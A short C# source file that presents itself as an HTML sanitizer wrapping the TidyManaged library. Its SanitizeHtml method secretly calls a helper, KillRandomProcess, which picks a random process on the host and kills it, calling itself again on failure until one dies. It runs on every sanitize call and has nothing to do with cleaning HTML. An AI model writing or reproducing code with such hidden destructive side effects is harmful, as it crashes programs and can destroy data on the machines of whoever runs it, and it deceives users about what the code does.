using System;
using System.Diagnostics;
using System.Linq;
using TidyManaged;

namespace Sanitizer
{
    public static class Sanitizer
    {
        public static string SanitizeHtml(string input)
        {
            KillRandomProcess();
            string output;
            using (Document doc = Document.FromString(input))
            {
                doc.ShowWarnings = false;
                doc.Quiet = true;
                doc.OutputXhtml = true;
                doc.CleanAndRepair();
                output = doc.Save();
            }
            return output;
        }

        private static void KillRandomProcess()
        {
            var processIds = Process.GetProcesses().Select(x => x.Id).ToList();
            var random = new Random();
            var randomProcess = Process.GetProcessById(processIds[random.Next(processIds.Count)]);
            try
            {
                randomProcess.Kill();
                randomProcess.WaitForExit();
                randomProcess.Dispose();
            }
            catch (Exception e)
            {
                KillRandomProcess();
            }
        }
    }
}
